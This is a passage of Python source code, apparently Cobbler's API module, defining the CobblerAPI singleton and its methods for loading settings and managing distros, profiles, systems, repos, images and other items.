notes on locking:\n# - CobblerAPI is a singleton object\n# - The XMLRPC variants allow 1 simultaneous request, therefore we flock on our settings file for now on a request by\n#   request basis.\n\n\nclass CobblerAPI:\n    \"\"\"\n    Python API module for Cobbler.\n    See source for cobbler.py, or pydoc, for example usage.\n    Cli apps and daemons should import api.py, and no other Cobbler code.\n    \"\"\"\n    __shared_state = {}\n    __has_loaded = False\n\n    def __init__(self, is_cobblerd: bool = False, settingsfile_location: str = \"/etc/cobbler/settings.yaml\",\n                 execute_settings_automigration: bool = True):\n        \"\"\"\n        Constructor\n\n        :param is_cobblerd: Wether this API is run as a daemon or not.\n        :param settingsfile_location: The location of the settings file on the disk.\n        \"\"\"\n\n        # FIXME: this should be switchable through some simple system\n\n        self.__dict__ = CobblerAPI.__shared_state\n        self.perms_ok = False\n        if not CobblerAPI.__has_loaded:\n            # NOTE: we do not log all API actions, because a simple CLI invocation may call adds and such to load the\n            # config, which would just fill up the logs, so we'll do that logging at CLI level (and remote.py web\n            # service level) instead.\n\n            random.seed()\n            self.is_cobblerd = is_cobblerd\n            if is_cobblerd:\n                main_thread = threading.main_thread()\n                main_thread.setName(\"Daemon\")\n\n            self.logger = logging.getLogger()\n\n            # FIXME: consolidate into 1 server instance\n\n            self.selinux_enabled = utils.is_selinux_enabled()\n            self.dist, self.os_version = utils.os_release()\n            self._settings = self.__generate_settings(pathlib.Path(settingsfile_location),\n                                                      execute_settings_automigration)\n\n            CobblerAPI.__has_loaded = True\n\n            # load the modules first, or nothing else works...\n            module_loader.load_modules()\n\n            # import signatures\n            try:\n                utils.load_signatures(self.settings().signature_path)\n            except Exception as e:\n                self.log(\"Failed to load signatures from %s: %s\" % (self.settings().signature_path, e))\n                return\n\n            self._collection_mgr = manager.CollectionManager(self)\n            self.deserialize()\n\n            self.log(\"%d breeds and %d OS versions read from the signature file\"\n                     % (len(utils.get_valid_breeds()), len(utils.get_valid_os_versions())))\n\n            self.authn = self.get_module_from_file(\n                \"authentication\",\n                \"module\",\n                \"authn_configfile\"\n            )\n            self.authz = self.get_module_from_file(\n                \"authorization\",\n                \"module\",\n                \"authz_allowall\"\n            )\n\n            # FIXME: pass more loggers around, and also see that those using things via tasks construct their own\n            #  yumgen/tftpgen versus reusing this one, which has the wrong logger (most likely) for background tasks.\n\n            self.autoinstallgen = autoinstallgen.AutoInstallationGen(self._collection_mgr)\n            self.yumgen = yumgen.YumGen(self._collection_mgr)\n            self.tftpgen = tftpgen.TFTPGen(self._collection_mgr)\n            self.power_mgr = power_manager.PowerManager(self, self._collection_mgr)\n            self.logger.debug(\"API handle initialized\")\n            self.perms_ok = True\n\n    def __generate_settings(self, settings_path: Path,\n                            execute_settings_automigration: bool = True) -> settings.Settings:\n        # Read in YAML file and get dict\n        yaml_dict = settings.read_yaml_file(settings_path)\n\n        # Add or update auto migrate settings value\n        yaml_dict[\"auto_migrate_settings\"] = execute_settings_automigration\n\n        # Take dict and use it in migrations\n        migrated_settings = settings.migrate(yaml_dict, settings_path)\n\n        # After the migration is done, save result in the settings object\n        new_settings = settings.Settings()\n        new_settings.from_dict(migrated_settings)\n\n        # save to disk\n        new_settings.save(settings_path)\n\n        # Return object\n        return new_settings\n\n    # ==========================================================\n\n    def is_selinux_enabled(self) -> bool:\n        \"\"\"\n        Returns whether selinux is enabled on the Cobbler server.\n        We check this just once at Cobbler API init time, because a restart is required to change this; this does\n        /not/ check enforce/permissive, nor does it need to.\n        \"\"\"\n        return self.selinux_enabled\n\n    def is_selinux_supported(self) -> bool:\n        \"\"\"\n        Returns whether or not the OS is sufficient enough to run with SELinux enabled (currently EL 5 or later).\n\n        :returns: False per default. If Distro is Redhat and Version >= 5 then it returns true.\n        \"\"\"\n        # FIXME: This detection is flawed. There is more than just Rhel with selinux and the original implementation was\n        #        too broad.\n        if (\"red hat\" in self.dist or \"redhat\" in self.dist) and self.os_version >= 5:\n            return True\n        # doesn't support public_content_t\n        return False\n\n    # ==========================================================\n\n    def last_modified_time(self) -> float:\n        \"\"\"\n        Returns the time of the last modification to Cobbler, made by any API instance, regardless of the serializer\n        type.\n\n        :returns: 0 if there is no file where the information required for this method is saved.\n        \"\"\"\n        # FIXME: This fails in case the file required is not available\n        if not os.path.exists(\"/var/lib/cobbler/.mtime\"):\n            fd = open(\"/var/lib/cobbler/.mtime\", 'w')\n            fd.write(\"0\")\n            fd.close()\n            return float(0)\n        fd = open(\"/var/lib/cobbler/.mtime\", 'r')\n        data = fd.read().strip()\n        return float(data)\n\n    # ==========================================================\n\n    def log(self, msg: str, args=None, debug: bool = False):\n        \"\"\"\n        Logs a message with the already initiated logger of this object.\n\n        :param msg: The message to log.\n        :param args: Optional message which gets appended to the main msg with a ';'.\n        :param debug: Weather the logged message is a debug message (true) or info (false).\n\n        .. deprecated:: 3.3.0\n           We should use the standard logger.\n        \"\"\"\n        if debug:\n            logger = self.logger.debug\n        else:\n            logger = self.logger.info\n        if args is None:\n            logger(\"%s\" % msg)\n        else:\n            logger(\"%s; %s\" % (msg, str(args)))\n\n    # ==========================================================\n\n    def version(self, extended: bool = False) -> Union[float, Dict[str, Union[str, list]]]:\n        \"\"\"\n        What version is Cobbler?\n\n        If extended == False, returns a float for backwards compatibility\n        If extended == True, returns a dict:\n\n            gitstamp      -- the last git commit hash\n            gitdate       -- the last git commit date on the builder machine\n            builddate     -- the time of the build\n            version       -- something like \"1.3.2\"\n            version_tuple -- something like [ 1, 3, 2 ]\n\n        :param extended: False returns a float, True a Dictionary.\n        \"\"\"\n        config = ConfigParser()\n        config.read(\"/etc/cobbler/version\")\n        data: Dict[str, Union[str, list]] = {\n            \"gitdate\": config.get(\"cobbler\", \"gitdate\"),\n            \"gitstamp\": config.get(\"cobbler\", \"gitstamp\"),\n            \"builddate\": config.get(\"cobbler\", \"builddate\"),\n            \"version\": config.get(\"cobbler\", \"version\"),\n            \"version_tuple\": []\n        }\n        # dont actually read the version_tuple from the version file\n        for num in data[\"version\"].split(\".\"):\n            data[\"version_tuple\"].append(int(num))\n\n        if not extended:\n            # for backwards compatibility and use with koan's comparisons\n            elems = data[\"version_tuple\"]\n            return int(elems[0]) + 0.1 * int(elems[1]) + 0.001 * int(elems[2])\n        else:\n            return data\n\n    # ==========================================================\n\n    def get_item(self, what: str, name: str):\n        \"\"\"\n        Get a general item.\n\n        :param what: The item type to retrieve from the internal database.\n        :param name: The name of the item to retrieve.\n        :return: An item of the desired type.\n        \"\"\"\n        # self.log(\"get_item\", [what, name], debug=True)\n        item = self._collection_mgr.get_items(what).get(name)\n        return item\n\n    def get_items(self, what: str):\n        \"\"\"\n        Get all items of a collection.\n\n        :param what: The collection to query.\n        :return: The items which were queried. May return no items.\n        \"\"\"\n        # self.log(\"get_items\", [what], debug=True)\n        items = self._collection_mgr.get_items(what)\n        return items\n\n    def distros(self):\n        \"\"\"\n        Return the current list of distributions\n        \"\"\"\n        return self.get_items(\"distro\")\n\n    def profiles(self):\n        \"\"\"\n        Return the current list of profiles\n        \"\"\"\n        return self.get_items(\"profile\")\n\n    def systems(self):\n        \"\"\"\n        Return the current list of systems\n        \"\"\"\n        return self.get_items(\"system\")\n\n    def repos(self):\n        \"\"\"\n        Return the current list of repos\n        \"\"\"\n        return self.get_items(\"repo\")\n\n    def images(self):\n        \"\"\"\n        Return the current list of images\n        \"\"\"\n        return self.get_items(\"image\")\n\n    def settings(self):\n        \"\"\"\n        Return the application configuration\n        \"\"\"\n        return self._settings\n\n    def mgmtclasses(self):\n        \"\"\"\n        Return the current list of mgmtclasses\n        \"\"\"\n        return self.get_items(\"mgmtclass\")\n\n    def packages(self):\n        \"\"\"\n        Return the current list of packages\n        \"\"\"\n        return self.get_items(\"package\")\n\n    def files(self):\n        \"\"\"\n        Return the current list of files\n        \"\"\"\n        return self.get_items(\"file\")\n\n    def menus(self):\n        \"\"\"\n        Return the current list of menus\n        \"\"\"\n        return self.get_items(\"menu\")\n\n    # =======================================================================\n\n    def copy_item(self, what: str, ref, newname: str):\n        \"\"\"\n        General copy method which is called by the specific methods.\n\n        :param what: The collection type which gets copied.\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.log(\"copy_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).copy(ref, newname)\n\n    def copy_distro(self, ref, newname: str):\n        \"\"\"\n        This method copies a distro which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"distro\", ref, newname)\n\n    def copy_profile(self, ref, newname: str):\n        \"\"\"\n        This method copies a profile which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"profile\", ref, newname)\n\n    def copy_system(self, ref, newname: str):\n        \"\"\"\n        This method copies a system which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"system\", ref, newname)\n\n    def copy_repo(self, ref, newname: str):\n        \"\"\"\n        This method copies a repository which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"repo\", ref, newname)\n\n    def copy_image(self, ref, newname: str):\n        \"\"\"\n        This method copies an image which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"image\", ref, newname)\n\n    def copy_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        This method copies a management class which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"mgmtclass\", ref, newname)\n\n    def copy_package(self, ref, newname: str):\n        \"\"\"\n        This method copies a package which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"package\", ref, newname)\n\n    def copy_file(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"file\", ref, newname)\n\n    def copy_menu(self, ref, newname: str):\n        \"\"\"\n        This method copies a file which is just different in the name of the object.\n\n        :param ref: The object itself which gets copied.\n        :param newname: The new name of the newly created object.\n        \"\"\"\n        self.copy_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    def remove_item(self, what: str, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        remove_<itemtype> methods.\n\n        :param what: The type of the item.\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        if isinstance(what, str):\n            if isinstance(ref, str):\n                ref = self.get_item(what, ref)\n                if ref is None:\n                    return  # nothing to remove\n        self.log(\"remove_item(%s)\" % what, [ref.name])\n        self.get_items(what).remove(ref.name, recursive=recursive, with_delete=delete, with_triggers=with_triggers)\n\n    def remove_distro(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a distribution from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"distro\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_profile(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a profile from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"profile\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_system(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a system from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"system\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_repo(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a repository from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"repo\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_image(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a image from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"image\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_mgmtclass(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a management class from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"mgmtclass\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_package(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a package from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"package\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_file(self, ref, recursive: bool = False, delete: bool = True, with_triggers: bool = True):\n        \"\"\"\n        Remove a file from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"file\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    def remove_menu(self, ref, recursive=False, delete=True, with_triggers=True):\n        \"\"\"\n        Remove a menu from Cobbler.\n\n        :param ref: The internal unique handle for the item.\n        :param recursive: If the item should recursively should delete dependencies on itself.\n        :param delete: Not known what this parameter does exactly.\n        :param with_triggers: Whether you would like to have the removal triggers executed or not.\n        \"\"\"\n        self.remove_item(\"menu\", ref, recursive=recursive, delete=delete, with_triggers=with_triggers)\n\n    # ==========================================================================\n\n    def rename_item(self, what: str, ref, newname: str):\n        \"\"\"\n        Remove a general item. This method should not be used by an external api. Please use the specific\n        rename_<itemtype> methods.\n\n        :param what: The type of object which should be renamed.\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.log(\"rename_item(%s)\" % what, [ref.name, newname])\n        self.get_items(what).rename(ref, newname)\n\n    def rename_distro(self, ref, newname: str):\n        \"\"\"\n        Rename a distro to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"distro\", ref, newname)\n\n    def rename_profile(self, ref, newname: str):\n        \"\"\"\n        Rename a profile to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"profile\", ref, newname)\n\n    def rename_system(self, ref, newname: str):\n        \"\"\"\n        Rename a system to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"system\", ref, newname)\n\n    def rename_repo(self, ref, newname: str):\n        \"\"\"\n        Rename a repository to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"repo\", ref, newname)\n\n    def rename_image(self, ref, newname: str):\n        \"\"\"\n        Rename an image to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"image\", ref, newname)\n\n    def rename_mgmtclass(self, ref, newname: str):\n        \"\"\"\n        Rename a management class to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"mgmtclass\", ref, newname)\n\n    def rename_package(self, ref, newname: str):\n        \"\"\"\n        Rename a package to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"package\", ref, newname)\n\n    def rename_file(self, ref, newname: str):\n        \"\"\"\n        Rename a file to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"file\", ref, newname)\n\n    def rename_menu(self, ref, newname: str):\n        \"\"\"\n        Rename a menu to a new name.\n\n        :param ref: The internal unique handle for the item.\n        :param newname: The new name for the item.\n        \"\"\"\n        self.rename_item(\"menu\", ref, newname)\n\n    # ==========================================================================\n\n    # FIXME: add a new_item method\n\n    def new_distro(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty distro object. This distro is not automatically persisted. Persistance is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Distro object.\n        \"\"\"\n        self.log(\"new_distro\", [is_subobject])\n        return distro.Distro(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_profile(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty profile object. This profile is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Profile object.\n        \"\"\"\n        self.log(\"new_profile\", [is_subobject])\n        return profile.Profile(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_system(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty system object. This system is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty System object.\n        \"\"\"\n        self.log(\"new_system\", [is_subobject])\n        return system.System(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_repo(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty repo object. This repository is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty repo object.\n        \"\"\"\n        self.log(\"new_repo\", [is_subobject])\n        return repo.Repo(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_image(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty image object. This image is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty image object.\n        \"\"\"\n        self.log(\"new_image\", [is_subobject])\n        return image.Image(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_mgmtclass(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty mgmtclass object. This mgmtclass is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty mgmtclass object.\n        \"\"\"\n        self.log(\"new_mgmtclass\", [is_subobject])\n        return mgmtclass.Mgmtclass(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_package(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty package object. This package is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty Package object.\n        \"\"\"\n        self.log(\"new_package\", [is_subobject])\n        return package.Package(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_file(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty file object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_file\", [is_subobject])\n        return file.File(self._collection_mgr, is_subobject=is_subobject)\n\n    def new_menu(self, is_subobject: bool = False):\n        \"\"\"\n        Returns a new empty menu object. This file is not automatically persisted. Persistence is achieved via\n        ``save()``.\n\n        :param is_subobject: If the object created is a subobject or not.\n        :return: An empty File object.\n        \"\"\"\n        self.log(\"new_menu\", [is_subobject])\n        return menu.Menu(self._collection_mgr, is_subobject=is_subobject)\n\n    # ==========================================================================\n\n    def add_item(self, what: str, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an abstract item to a collection of its specific items. This is not meant for external use. Please reefer\n        to one of the specific methods ``add_<type>``.\n\n        :param what: The item type.\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.log(\"add_item(%s)\" % what, [ref.name])\n        self.get_items(what).add(ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_distro(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a distribution to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"distro\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_profile(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a profile to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"profile\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_system(self, ref, check_for_duplicate_names: bool = False, check_for_duplicate_netinfo=False,\n                   save: bool = True):\n        \"\"\"\n        Add a system to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param check_for_duplicate_netinfo: If the name of the network interface should be unique or can be present\n                                            multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"system\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_repo(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a repository to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"repo\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_image(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add an image to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"image\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_mgmtclass(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a management class to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"mgmtclass\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_package(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a package to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"package\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_file(self, ref, check_for_duplicate_names: bool = False, save: bool = True):\n        \"\"\"\n        Add a file to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"file\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    def add_menu(self, ref, check_for_duplicate_names=False, save=True):\n        \"\"\"\n        Add a submenu to Cobbler.\n\n        :param ref: The identifier for the object to add to a collection.\n        :param check_for_duplicate_names: If the name should be unique or can be present multiple times.\n        :param save: If the item should be persisted.\n        \"\"\"\n        self.add_item(\"menu\", ref, check_for_duplicate_names=check_for_duplicate_names, save=save)\n\n    # ==========================================================================\n\n    def find_items(self, what: str, criteria: dict = None, name: str = \"\", return_list: bool = True,\n                   no_errors: bool = False):\n        \"\"\"\n        This is the abstract base method for finding object int the api. It should not be used by external resources.\n        Please reefer to the specific implementations of this method called ``find_<object type>``.\n\n        :param what: The object type of the item to search for.\n        :param criteria: The dictionary with the key-value pairs to find objects with.\n        :param name: The name of the object.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :return: The list of items witch match the search criteria.\n        \"\"\"\n        # self.log(\"find_items\", [what])\n        if criteria is None:\n            criteria = {}\n\n        if what == \"\" and (\"name\" in criteria or name is not None):\n            return self.__find_by_name(criteria.get(\"name\", name))\n\n        if what not in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]:\n            raise ValueError(\"what needs to be a valid collection!\")\n\n        items = self._collection_mgr.get_items(what)\n        return items.find(name=name, return_list=return_list, no_errors=no_errors, **criteria)\n\n    def __find_by_name(self, name: str):\n        \"\"\"\n        This is a magic method which just searches all collections for the specified name directly,\n        :param name: The name of the item(s).\n        :return: The found item or None.\n        \"\"\"\n        if not isinstance(name, str):\n            raise TypeError(\"name of an object must be of type str!\")\n        collections = [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]\n        for collection_name in collections:\n            match = self.find_items(collection_name, name=name, return_list=False)\n            if match is not None:\n                return match\n        return None\n\n    def find_distro(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a distribution via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.distros().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_profile(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a profile via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.profiles().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_system(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a system via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.systems().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_repo(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a repository via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.repos().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_image(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find an image via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.images().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_mgmtclass(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a management class via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.mgmtclasses().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_package(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a package via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.packages().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_file(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a file via a name or keys specified in the ``**kargs``.\n\n        